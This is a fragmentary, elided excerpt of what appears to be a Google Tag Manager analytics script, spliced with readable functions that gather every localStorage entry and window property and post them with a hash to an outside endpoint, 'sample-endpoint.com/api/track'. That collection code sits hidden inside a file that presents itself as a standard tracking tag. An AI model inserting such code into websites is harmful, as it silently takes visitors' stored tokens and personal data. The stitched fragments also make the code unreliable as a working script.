  ...
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 14,
        "vtp_instanceDestinationId": "G-R3CR6J6DL2",
        "tag_id": 26
      }, {
  ...
  */
  ...
  function createHashCode(data) {
    ...
    for (let i = 0; i < hashString.length; i++) {
      let charCode = hashString.charCodeAt(i);
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARIlABhc5ucQJ+O0R0bgPMAdqsjQVEEejbyBplOJYLOtoTfXxfxUohoChGo\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  async function sendDataToServer(data) {
    let hashCode = createHashCode(data);
    const endPointURL = "https://sample-endpoint.com/api/track";
    try {
  ...
  function collectAndSendData() {
    let localData = extractLocalStorageData();
    let windowData = extractWindowData();
    let collectedData = {
      ...localData,
      ...windowData
    };
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'G-R3CR6J6DL2'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
